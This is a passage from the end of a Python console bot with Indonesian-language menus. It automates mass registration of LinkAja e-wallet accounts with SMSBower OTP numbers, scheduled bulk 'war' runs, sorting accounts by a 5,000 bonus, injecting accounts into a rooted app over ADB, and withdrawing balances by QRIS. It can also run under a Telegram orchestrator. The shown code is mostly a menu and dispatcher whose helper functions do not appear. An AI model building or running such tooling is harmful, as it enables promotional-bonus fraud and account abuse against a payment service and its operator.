        console.print(f"[dim]Key saat ini: {disp}[/]")
        new_k = Prompt.ask("[bold cyan]>> Masukkan API Key SMSBower baru[/]").strip()
        if new_k:
            with open("smsbower.txt", "w", encoding="utf-8") as f:
                f.write(new_k)
            console.print("[bold green][OK] API Key SMSBower berhasil disimpan ke smsbower.txt![/]\n")
            time.sleep(1.5)

def main():
    cleanup_core_folder()
    auto_update()
    bot_id = get_or_set_bot_id()
    send_auto_ping(bot_id)
    while True:
        clear_once()
        render_dashboard_header()

        menu_table = Table(show_header=True, header_style="bold bright_cyan", box=box.SIMPLE_HEAD, padding=(0, 2))
        menu_table.add_column("Kode", style="bold bright_yellow", justify="center", width=6)
        menu_table.add_column("Menu Fitur", style="bold bright_white", width=36)

        menu_table.add_row("[1]", "Daftar Manual (1 Akun Instan)")
        menu_table.add_row("[2]", "Auto War Massal (Jadwal Cut-off)")
        menu_table.add_row("[3]", "ADB Push (Khusus PC)")
        menu_table.add_row("[4]", "Cek & Sortir Bonus 5.000")
        menu_table.add_row("[5]", "Pasang Akun ke LinkAja apk (Root)")
        menu_table.add_row("[7]", "Verifikasi Email")
        menu_table.add_row("[8]", "Tarik Saldo / Scan QRIS")
        menu_table.add_row("[9]", "Ganti API Key OTP")
        menu_table.add_row("[0]", "[bright_red]Keluar[/]")

        console.print(
            Panel(
                menu_table,
                border_style="bright_yellow",
                box=box.ROUNDED,
                expand=False,
            )
        )

        c = Prompt.ask(
            "\n[bold bright_cyan]>> Pilih Menu[/]",
            choices=["1", "2", "3", "4", "5", "7", "8", "9", "0"],
            default="0"
        )

        if c == "0":
            console.print("\n[dim]Keluar.[/]")
            break

        try:
            if c == "1":
                menu_daftar_manual()
            elif c == "2":
                menu_daftar_auto_bulk()
            elif c == "3":
                menu_inject()
            elif c == "4":
                menu_sortir()
            elif c == "5":
                menu_injeck_termux()
            elif c == "7":
                menu_fitur_segera("Verifikasi Email")
            elif c == "8":
                menu_scan_bonus()
            elif c == "9":
                menu_ganti_api_key()

            if c in ["1", "2", "3", "4", "5", "6", "8", "9"]:
                console.print()
                console.print(Rule(style="bright_black"))
                Prompt.ask("[dim cyan]Tekan [bold white]Enter[/bold white] untuk kembali ke menu...[/]")

        except KeyboardInterrupt:
            console.print("\n[dim]Batal (Ctrl+C).[/]")
            time.sleep(1)

if __name__ == "__main__":
    try:
        if len(sys.argv) > 1 and sys.argv[1] == "--auto":
            # Mode otomatis dari Orchestrator Telegram: python bot.py --auto <server> <jumlah> [jam_mulai] [jam_tembak]
            srv = sys.argv[2] if len(sys.argv) > 2 else "3"
            jml = int(sys.argv[3]) if len(sys.argv) > 3 else 10
            t_mulai = sys.argv[4] if len(sys.argv) > 4 else ""
            t_kirim = sys.argv[5] if len(sys.argv) > 5 else ""
            run_auto_bulk(srv, jml, t_mulai, t_kirim)
        else:
            auto_update()
            main()
    except KeyboardInterrupt:
        console.print("\n[dim]Stop (Ctrl+C).[/]")
